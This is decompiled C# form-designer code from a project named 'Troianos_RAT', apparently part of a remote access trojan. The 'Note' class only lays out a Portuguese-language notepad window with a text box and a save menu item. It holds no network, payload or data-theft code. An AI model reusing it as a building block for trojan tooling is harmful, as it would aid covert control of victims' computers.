namespace Troianos_RAT
{
	// Token: 0x02000017 RID: 23
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class Note : global::System.Windows.Forms.Form
	{
		// Token: 0x060002B1 RID: 689 RVA: 0x001F212C File Offset: 0x001F052C
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x060002B2 RID: 690 RVA: 0x001F217C File Offset: 0x001F057C
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Troianos_RAT.Note));
			this.MenuStrip1 = new global::System.Windows.Forms.MenuStrip();
			this.ToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.TextBox1 = new global::System.Windows.Forms.TextBox();
			this.MenuStrip1.SuspendLayout();
			this.SuspendLayout();
			this.MenuStrip1.BackColor = global::System.Drawing.Color.Black;
			this.MenuStrip1.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.MenuStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ToolStripMenuItem1
			});
			this.MenuStrip1.LayoutStyle = global::System.Windows.Forms.ToolStripLayoutStyle.Flow;
			global::System.Windows.Forms.Control menuStrip = this.MenuStrip1;
			global::System.Drawing.Point location = new global::System.Drawing.Point(0, 0);
			menuStrip.Location = location;
			this.MenuStrip1.Name = "MenuStrip1";
			global::System.Windows.Forms.Control menuStrip2 = this.MenuStrip1;
			global::System.Drawing.Size size = new global::System.Drawing.Size(629, 22);
			menuStrip2.Size = size;
			this.MenuStrip1.TabIndex = 0;
			this.MenuStrip1.Text = "MenuStrip1";
			this.ToolStripMenuItem1.ForeColor = global::System.Drawing.Color.White;
			this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
			global::System.Windows.Forms.ToolStripItem toolStripMenuItem = this.ToolStripMenuItem1;
			size = new global::System.Drawing.Size(115, 18);
			toolStripMenuItem.Size = size;
			this.ToolStripMenuItem1.Text = "Salvar Alteraçoes";
			this.TextBox1.BackColor = global::System.Drawing.Color.Black;
			this.TextBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.TextBox1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.TextBox1.ForeColor = global::System.Drawing.Color.White;
			global::System.Windows.Forms.Control textBox = this.TextBox1;
			location = new global::System.Drawing.Point(0, 22);
			textBox.Location = location;
			this.TextBox1.Multiline = true;
			this.TextBox1.Name = "TextBox1";
			this.TextBox1.ScrollBars = global::System.Windows.Forms.ScrollBars.Both;
			global::System.Windows.Forms.Control textBox2 = this.TextBox1;
			size = new global::System.Drawing.Size(629, 206);
			textBox2.Size = size;
			this.TextBox1.TabIndex = 1;
			global::System.Drawing.SizeF autoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.Black;
			size = new global::System.Drawing.Size(629, 228);
			this.ClientSize = size;
			this.Controls.Add(this.TextBox1);
			this.Controls.Add(this.MenuStrip1);
			this.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			this.MainMenuStrip = this.MenuStrip1;
			this.Name = "Note";
			this.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Bloco de Notas";
			this.MenuStrip1.ResumeLayout(false);
			this.MenuStrip1.PerformLayout();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		// Token: 0x0400014D RID: 333
		private global::System.ComponentModel.IContainer components;
	}
}
